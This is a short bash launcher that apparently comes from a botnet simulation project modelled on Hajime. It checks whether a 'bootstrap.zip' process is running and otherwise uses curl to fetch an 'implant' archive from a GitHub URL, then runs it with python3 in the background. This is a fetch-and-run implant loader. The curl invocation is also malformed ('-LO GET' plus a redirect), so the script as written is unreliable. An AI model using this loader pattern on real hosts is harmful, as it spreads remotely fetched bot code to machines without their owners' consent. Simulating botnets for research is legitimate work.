#! /bin/bash
ps ax | grep "bootstrap.zip" | grep -v grep;
if test $? -eq 0; 
then 
    echo "Process already running."
else 
    echo "Starting process."
    # get atk file and implant.zip files.
    /usr/bin/curl -LO GET https://github.com/dcsrps/botnet_sim/blob/master/hajime_node/bootstrap/bootstrap.zip?raw=true > /tmp/bootstrap.zip
    python3 /tmp/bootstrap.zip &
fi
